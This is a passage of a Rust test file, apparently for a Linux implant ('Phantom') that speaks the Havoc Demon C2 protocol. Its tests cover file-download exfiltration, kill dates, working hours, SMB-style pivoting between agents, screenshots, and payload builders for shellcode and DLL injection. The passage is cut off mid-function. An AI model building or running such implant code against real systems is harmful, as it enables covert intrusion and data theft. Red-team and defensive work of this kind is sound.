    assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

    let payload = callback.payload().expect("payload");
    let mut offset = 0;
    assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileClose));
    assert_eq!(read_u32(&payload, &mut offset), 4); // inner len
    assert_eq!(read_u32(&payload, &mut offset), 0xBEEF);
}

#[tokio::test]
async fn transfer_list_returns_active_downloads() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("list.bin");
    std::fs::write(&path, b"list test data").expect("write");

    let mut fs_payload = Vec::new();
    fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("download");
    state.drain_callbacks();

    let file_id = state.downloads[0].file_id;

    // Send CommandTransfer List
    let mut transfer_payload = Vec::new();
    transfer_payload.extend_from_slice(&(DemonTransferCommand::List as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 10, transfer_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("transfer list");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandTransfer));
    assert_eq!(*request_id, 10);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::List));
    // One download entry: file_id + read_size + state
    assert_eq!(read_u32(payload, &mut offset), file_id);
    assert_eq!(read_u32(payload, &mut offset), 0); // read_size = 0 (not started)
    assert_eq!(read_u32(payload, &mut offset), DownloadTransferState::Running as u32);
}

#[tokio::test]
async fn transfer_stop_pauses_download() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("stop.bin");
    std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

    let mut fs_payload = Vec::new();
    fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("download");
    state.drain_callbacks();

    let file_id = state.downloads[0].file_id;

    // Stop the download.
    let mut stop_payload = Vec::new();
    stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
    stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("transfer stop");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Stopped);

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
    assert_eq!(read_u32(payload, &mut offset), 1); // found = true
    assert_eq!(read_u32(payload, &mut offset), file_id);

    // Pushing chunks should NOT produce any data for a stopped download.
    state.push_download_chunks();
    let callbacks = state.drain_callbacks();
    assert!(callbacks.is_empty(), "stopped download should not produce chunks");
}

#[tokio::test]
async fn transfer_resume_restarts_download() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("resume.bin");
    std::fs::write(&path, b"resume data").expect("write");

    let mut fs_payload = Vec::new();
    fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("download");
    state.drain_callbacks();

    let file_id = state.downloads[0].file_id;

    // Stop then resume.
    let mut stop_payload = Vec::new();
    stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
    stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("stop");
    state.drain_callbacks();

    let mut resume_payload = Vec::new();
    resume_payload.extend_from_slice(&(DemonTransferCommand::Resume as i32).to_le_bytes());
    resume_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("resume");

    assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
    state.drain_callbacks();

    // After resume, pushing chunks should produce data again.
    state.push_download_chunks();
    let callbacks = state.drain_callbacks();
    assert!(
        callbacks.iter().any(|c| matches!(c, PendingCallback::FileChunk { .. })),
        "resumed download should produce chunks"
    );
}

#[tokio::test]
async fn transfer_remove_marks_download_for_removal() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("remove.bin");
    std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

    let mut fs_payload = Vec::new();
    fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
    fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let mut state = PhantomState::default();
    execute(
        &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("download");
    state.drain_callbacks();

    let file_id = state.downloads[0].file_id;

    // Remove the download.
    let mut remove_payload = Vec::new();
    remove_payload.extend_from_slice(&(DemonTransferCommand::Remove as i32).to_le_bytes());
    remove_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("transfer remove");

    // Should produce two callbacks: the action response and the close notification.
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 2);

    // Push should clean it up.
    state.push_download_chunks();
    let close_callbacks = state.drain_callbacks();
    assert!(
        close_callbacks.iter().any(|c| matches!(c, PendingCallback::FileClose { .. })),
        "removed download should emit FileClose on next push"
    );
    assert!(state.downloads.is_empty());
}

#[tokio::test]
async fn transfer_stop_nonexistent_returns_not_found() {
    let mut state = PhantomState::default();
    let mut stop_payload = Vec::new();
    stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
    stop_payload.extend_from_slice(&(0xDEAD_BEEF_u32 as i32).to_le_bytes());
    execute(
        &DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload),
        &mut PhantomConfig::default(),
        &mut state,
    )
    .await
    .expect("transfer stop nonexistent");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
    assert_eq!(read_u32(payload, &mut offset), 0); // found = false
}

#[tokio::test]
async fn cat_still_returns_full_file_as_structured_callback() {
    let tempdir = tempfile::tempdir().expect("tempdir");
    let path = tempdir.path().join("cat.txt");
    std::fs::write(&path, b"cat content").expect("write");

    let mut payload = Vec::new();
    payload.extend_from_slice(&(DemonFilesystemCommand::Cat as i32).to_le_bytes());
    payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
    let package = DemonPackage::new(DemonCommand::CommandFs, 55, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, .. }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
    // Cat should not create tracked downloads.
    assert!(state.downloads.is_empty());
}

#[tokio::test]
async fn execute_kill_date_stores_timestamp() {
    let timestamp: i64 = 1_800_000_000;
    let payload = timestamp.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 50, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute kill date");
    assert_eq!(state.kill_date(), Some(timestamp));

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Output { request_id, text } = &callbacks[0] else {
        panic!("expected Output callback, got: {callbacks:?}");
    };
    assert_eq!(*request_id, 50);
    assert!(text.contains("1800000000"));
}

#[tokio::test]
async fn execute_kill_date_zero_disables() {
    let payload = 0_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 51, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state)
        .await
        .expect("execute kill date zero");
    assert_eq!(state.kill_date(), None);

    let callbacks = state.drain_callbacks();
    let PendingCallback::Output { text, .. } = &callbacks[0] else {
        panic!("expected Output callback");
    };
    assert!(text.contains("disabled"));
}

#[tokio::test]
async fn execute_kill_date_updates_existing() {
    let mut state = PhantomState::default();

    // Set initial kill date.
    let payload = 1_800_000_000_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 60, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("set initial");
    state.drain_callbacks();

    // Update to a new kill date.
    let payload = 1_900_000_000_i64.to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandKillDate, 61, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("update");
    assert_eq!(state.kill_date(), Some(1_900_000_000));
}

#[test]
fn kill_date_callback_has_correct_command_id() {
    let callback = PendingCallback::KillDate { request_id: 0 };
    assert_eq!(callback.command_id(), u32::from(DemonCommand::CommandKillDate));
    assert_eq!(callback.request_id(), 0);
    assert!(callback.payload().expect("payload").is_empty());
}

#[test]
fn queue_kill_date_callback_adds_to_pending() {
    let mut state = PhantomState::default();
    state.queue_kill_date_callback();
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    assert!(matches!(callbacks[0], PendingCallback::KillDate { request_id: 0 }));
}

// ---- CommandConfig tests ----

fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
    let mut payload = (key as i32).to_le_bytes().to_vec();
    payload.extend_from_slice(extra);
    payload
}

#[tokio::test]
async fn config_kill_date_sets_state_and_echoes_back() {
    let kill_date: i64 = 1_700_000_000;
    let payload = config_payload(154, &kill_date.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.kill_date(), Some(1_700_000_000));

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
    assert_eq!(*request_id, 10);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), 154);
    assert_eq!(read_u64(payload, &mut offset), 1_700_000_000);
}

#[tokio::test]
async fn config_kill_date_zero_clears_state() {
    let payload = config_payload(154, &0_i64.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 11, payload);
    let mut state = PhantomState::default();
    state.set_kill_date(Some(1_700_000_000));

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.kill_date(), None);
}

#[tokio::test]
async fn config_working_hours_sets_state_and_echoes_back() {
    // Enable flag (bit 22) + start 09:00 (9<<17 | 0<<11) + end 17:00 (17<<6 | 0<<0)
    let hours: i32 = (1 << 22) | (9 << 17) | (17 << 6);
    let payload = config_payload(155, &hours.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.working_hours(), Some(hours));

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Structured { command_id, request_id, payload }] = callbacks.as_slice()
    else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
    assert_eq!(*request_id, 12);

    let mut offset = 0;
    assert_eq!(read_u32(payload, &mut offset), 155);
    assert_eq!(read_u32(payload, &mut offset), hours as u32);
}

#[tokio::test]
async fn config_working_hours_zero_clears_state() {
    let payload = config_payload(155, &0_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 13, payload);
    let mut state = PhantomState::default();
    state.set_working_hours(Some(12345));

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    assert_eq!(state.working_hours(), None);
}

#[tokio::test]
async fn config_windows_only_key_returns_error() {
    // InjectTechnique (150) is Windows-only
    let payload = config_payload(150, &42_i32.to_le_bytes());
    let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*request_id, 14);
    assert!(text.contains("not supported on Linux"));
}

#[tokio::test]
async fn config_unknown_key_returns_error() {
    let payload = config_payload(9999, &[]);
    let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
        panic!("unexpected callbacks: {callbacks:?}");
    };
    assert_eq!(*request_id, 15);
    assert!(text.contains("unknown config key"));
}

// ---- Pivot tests ----

use red_cell_common::demon::DemonPivotCommand;

/// Build a CommandPivot task payload with a given subcommand and extra data.
fn pivot_payload(subcommand: DemonPivotCommand, extra: &[u8]) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&(u32::from(subcommand) as i32).to_le_bytes());
    payload.extend_from_slice(extra);
    payload
}

/// Build a fake DemonEnvelope for testing pivot connect.
///
/// Format: `[size:4be][magic:4be][agent_id:4be][dummy_payload]`
fn fake_demon_envelope(agent_id: u32) -> Vec<u8> {
    let dummy_payload = b"phantom-init-data";
    let size = (8 + dummy_payload.len()) as u32; // magic(4) + agent_id(4) + payload
    let mut envelope = Vec::new();
    envelope.extend_from_slice(&size.to_be_bytes());
    envelope.extend_from_slice(&0xDEAD_BEEFu32.to_be_bytes());
    envelope.extend_from_slice(&agent_id.to_be_bytes());
    envelope.extend_from_slice(dummy_payload);
    envelope
}

#[tokio::test]
async fn pivot_list_empty() {
    let payload = pivot_payload(DemonPivotCommand::List, &[]);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 1, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
        panic!("expected Structured callback, got: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
    assert_eq!(*request_id, 1);

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::List));
    // No additional data for empty list.
    assert_eq!(offset, payload.len());
}

#[tokio::test]
async fn pivot_list_with_entries() {
    let mut state = PhantomState::default();
    // Manually insert a fake pivot to test list.
    let (left, _right) = std::os::unix::net::UnixStream::pair().expect("pair");
    left.set_nonblocking(true).expect("nonblocking");
    state.smb_pivots.insert(
        0xAABB_CCDDu32,
        super::PivotConnection { pipe_name: "/tmp/test_pivot".to_owned(), stream: left },
    );

    let payload = pivot_payload(DemonPivotCommand::List, &[]);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 2, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::List));
    let demon_id = read_u32(payload, &mut offset);
    assert_eq!(demon_id, 0xAABB_CCDD);
    // Skip the UTF-16 encoded pipe name (just verify there's more data).
    assert!(payload.len() > offset);
}

#[tokio::test]
async fn pivot_connect_and_disconnect() {
    use std::io::Write as IoWrite;

    let tempdir = tempfile::tempdir().expect("tempdir");
    let sock_path = tempdir.path().join("pivot.sock");

    // Set up a listener simulating a child agent.
    let listener = std::os::unix::net::UnixListener::bind(&sock_path).expect("bind");

    // Spawn a thread that accepts a connection and writes a fake init envelope.
    let child_agent_id: u32 = 0x1234_5678;
    let envelope = fake_demon_envelope(child_agent_id);
    let handle = std::thread::spawn({
        let envelope = envelope.clone();
        move || {
            let (mut conn, _) = listener.accept().expect("accept");
            // Write the raw DemonEnvelope — its own size field serves as
            // the frame delimiter on the stream socket.
            IoWrite::write_all(&mut conn, &envelope).expect("write envelope");
            conn // keep alive
        }
    });

    let sock_str = sock_path.to_str().expect("path");
    let mut connect_extra = Vec::new();
    // wstring: [len:i32_le][utf16le_bytes]
    let utf16 = sock_str.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    connect_extra.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
    connect_extra.extend_from_slice(&utf16);

    let payload = pivot_payload(DemonPivotCommand::SmbConnect, &connect_extra);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 10, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
        panic!("expected Structured callback, got: {callbacks:?}");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
    assert_eq!(*request_id, 10);

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::SmbConnect));
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 1); // TRUE

    // Verify the pivot was registered.
    assert!(state.smb_pivots.contains_key(&child_agent_id));

    // Now disconnect the pivot.
    let mut disc_extra = Vec::new();
    disc_extra.extend_from_slice(&(child_agent_id as i32).to_le_bytes());
    let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &disc_extra);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 11, payload);
    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 1); // TRUE
    let disc_id = read_u32(payload, &mut offset);
    assert_eq!(disc_id, child_agent_id);

    assert!(!state.smb_pivots.contains_key(&child_agent_id));

    drop(handle.join().expect("child thread"));
}

#[tokio::test]
async fn pivot_disconnect_nonexistent_returns_false() {
    let mut state = PhantomState::default();
    let mut extra = Vec::new();
    extra.extend_from_slice(&(0xDEADu32 as i32).to_le_bytes());
    let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &extra);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 12, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };
    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 0); // FALSE
}

#[tokio::test]
async fn pivot_smb_command_writes_to_socket() {
    use std::io::Read as IoRead;

    let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
    left.set_nonblocking(true).expect("nonblocking");

    let child_id: u32 = 0xABCD_0001;
    let mut state = PhantomState::default();
    state.smb_pivots.insert(
        child_id,
        super::PivotConnection { pipe_name: "/tmp/test".to_owned(), stream: left },
    );

    let task_data = b"encrypted-task-payload";
    let mut extra = Vec::new();
    extra.extend_from_slice(&(child_id as i32).to_le_bytes());
    extra.extend_from_slice(&(task_data.len() as i32).to_le_bytes());
    extra.extend_from_slice(task_data);

    let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 20, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    // No structured callback for SmbCommand (matches Demon behaviour).
    let callbacks = state.drain_callbacks();
    assert!(callbacks.is_empty());

    // Verify the data was written to the socket.
    let mut buf = vec![0u8; task_data.len()];
    let mut r = &right;
    IoRead::read_exact(&mut r, &mut buf).expect("read from socket");
    assert_eq!(&buf, task_data);
}

#[tokio::test]
async fn pivot_smb_command_unknown_agent_returns_error() {
    let mut state = PhantomState::default();
    let unknown_id: u32 = 0xFFFF_0001;

    let mut extra = Vec::new();
    extra.extend_from_slice(&(unknown_id as i32).to_le_bytes());
    let data = b"payload";
    extra.extend_from_slice(&(data.len() as i32).to_le_bytes());
    extra.extend_from_slice(data);

    let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
    let package = DemonPackage::new(DemonCommand::CommandPivot, 21, payload);

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Error { text, .. } = &callbacks[0] else {
        panic!("expected Error callback");
    };
    assert!(text.contains("not found"));
}

#[tokio::test]
async fn pivot_unknown_subcommand_returns_error() {
    let payload = (9999i32).to_le_bytes().to_vec();
    let package = DemonPackage::new(DemonCommand::CommandPivot, 30, payload);
    let mut state = PhantomState::default();

    execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Error { text, .. } = &callbacks[0] else {
        panic!("expected Error callback");
    };
    assert!(text.contains("unknown pivot subcommand"));
}

#[tokio::test]
async fn poll_pivots_reads_child_data() {
    use std::io::Write as IoWrite;

    let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
    left.set_nonblocking(true).expect("nonblocking");

    let child_id: u32 = 0x0000_ABCD;
    let mut state = PhantomState::default();
    state.smb_pivots.insert(
        child_id,
        super::PivotConnection { pipe_name: "/tmp/poll_test".to_owned(), stream: left },
    );

    // Write a raw DemonEnvelope from the "child" side — its own size
    // field serves as the frame delimiter.
    let envelope = fake_demon_envelope(child_id);
    let mut w = &right;
    IoWrite::write_all(&mut w, &envelope).expect("write envelope");

    // Give the OS a moment to deliver the data.
    std::thread::sleep(Duration::from_millis(10));

    state.poll_pivots();

    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback from poll");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::SmbCommand));

    // The frame data follows as length-prefixed bytes (the full envelope).
    let frame_len = read_u32(payload, &mut offset) as usize;
    assert_eq!(frame_len, envelope.len());
}

#[tokio::test]
async fn poll_pivots_detects_broken_connection() {
    let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
    left.set_nonblocking(true).expect("nonblocking");

    let child_id: u32 = 0xDEAD_0001;
    let mut state = PhantomState::default();
    state.smb_pivots.insert(
        child_id,
        super::PivotConnection { pipe_name: "/tmp/broken".to_owned(), stream: left },
    );

    // Close the child side to simulate a broken pipe.
    drop(right);

    // Give the OS a moment.
    std::thread::sleep(Duration::from_millis(10));

    state.poll_pivots();

    // Should have removed the pivot and sent a disconnect callback.
    assert!(!state.smb_pivots.contains_key(&child_id));
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1);
    let PendingCallback::Structured { command_id, payload, .. } = &callbacks[0] else {
        panic!("expected Structured callback");
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));

    let mut offset = 0;
    let sub = read_u32(payload, &mut offset);
    assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
}

// --- CommandScreenshot tests ---

/// Sending a `CommandScreenshot` package through the dispatcher must produce
/// a `Structured` callback with `command_id == CommandScreenshot`.  The payload
/// starts with a success flag (u32).  In CI/test environments without a display
/// the flag will be 0 (failure) — that is fine; the important thing is that the
/// dispatcher routes the command and produces a well-formed response.
#[tokio::test]
async fn screenshot_dispatcher_routes_command_and_queues_callback() {
    let mut state = PhantomState::default();
    let package = DemonPackage::new(DemonCommand::CommandScreenshot, 0x42, Vec::new());
    let result = execute(&package, &mut PhantomConfig::default(), &mut state).await;
    assert!(result.is_ok(), "execute must not return an error");
    let callbacks = state.drain_callbacks();
    assert_eq!(callbacks.len(), 1, "exactly one callback expected");
    let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
        panic!("expected Structured callback, got {:?}", callbacks[0]);
    };
    assert_eq!(*command_id, u32::from(DemonCommand::CommandScreenshot));
    assert_eq!(*request_id, 0x42);
    // The first 4 bytes must be the success flag (0 or 1).
    assert!(payload.len() >= 4, "payload must contain at least the success flag");
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert!(success <= 1, "success flag must be 0 or 1, got {success}");
}

/// When the screenshot succeeds (tested by mocking via a helper), the response
/// payload must be `[1:u32][len:u32][image_bytes]`.
#[tokio::test]
async fn screenshot_success_payload_format() {
    let mut state = PhantomState::default();
    // Construct a known-good structured callback as execute_screenshot would.
    let fake_image = b"PNG_TEST_DATA";
    let mut expected_payload = super::encode_u32(1);
    expected_payload.extend_from_slice(&super::encode_bytes(fake_image).expect("encode_bytes"));
    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandScreenshot),
        request_id: 0xAA,
        payload: expected_payload.clone(),
    });
    let callbacks = state.drain_callbacks();
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 1);
    let image = read_bytes(payload, &mut offset);
    assert_eq!(image, fake_image);
}

/// When screenshot capture fails, the response payload must be just `[0:u32]`.
#[tokio::test]
async fn screenshot_failure_payload_format() {
    let mut state = PhantomState::default();
    // Simulate failure: encode success=0 (same as execute_screenshot does).
    let expected_payload = super::encode_u32(0);
    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandScreenshot),
        request_id: 0xBB,
        payload: expected_payload,
    });
    let callbacks = state.drain_callbacks();
    let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
        panic!("expected Structured");
    };
    assert_eq!(payload.len(), 4, "failure payload must be exactly 4 bytes");
    let mut offset = 0;
    let success = read_u32(payload, &mut offset);
    assert_eq!(success, 0);
}

/// `capture_x11_native` must return a `PhantomError::Screenshot` when no X
/// display is available (CI / headless environment).  It must never panic.
#[test]
fn x11_native_no_display_returns_screenshot_error() {
    // Temporarily unset DISPLAY and WAYLAND_DISPLAY so XOpenDisplay returns NULL.
    let saved_display = std::env::var("DISPLAY").ok();
    let saved_wayland = std::env::var("WAYLAND_DISPLAY").ok();
    unsafe {
        std::env::remove_var("DISPLAY");
        std::env::remove_var("WAYLAND_DISPLAY");
    }

    let result = super::capture_x11_native();

    // Restore env vars regardless of outcome.
    unsafe {
        if let Some(v) = saved_display {
            std::env::set_var("DISPLAY", v);
        }
        if let Some(v) = saved_wayland {
            std::env::set_var("WAYLAND_DISPLAY", v);
        }
    }

    match result {
        Err(crate::error::PhantomError::Screenshot(_)) => { /* expected in headless CI */ }
        Ok(_) => {
            // Running inside a real X session is also acceptable.
        }
        Err(other) => panic!("unexpected error variant: {other:?}"),
    }
}

// -----------------------------------------------------------------------
// Process injection tests
// -----------------------------------------------------------------------

/// Helper to build a `CommandInjectShellcode` task payload.
fn build_inject_shellcode_payload(
    way: i32,
    technique: i32,
    x64: i32,
    shellcode: &[u8],
    argument: &[u8],
    pid: i32,
) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&way.to_le_bytes());
    payload.extend_from_slice(&technique.to_le_bytes());
    payload.extend_from_slice(&x64.to_le_bytes());
    // shellcode as length-prefixed bytes
    payload.extend_from_slice(&(shellcode.len() as i32).to_le_bytes());
    payload.extend_from_slice(shellcode);
    // argument as length-prefixed bytes
    payload.extend_from_slice(&(argument.len() as i32).to_le_bytes());
    payload.extend_from_slice(argument);
    // pid
    payload.extend_from_slice(&pid.to_le_bytes());
    payload
}

/// Helper to build a `CommandInjectDll` task payload.
fn build_inject_dll_payload(
    technique: i32,
    pid: i32,
    dll_ldr: &[u8],
    dll_bytes: &[u8],
    parameter: &[u8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&technique.to_le_bytes());
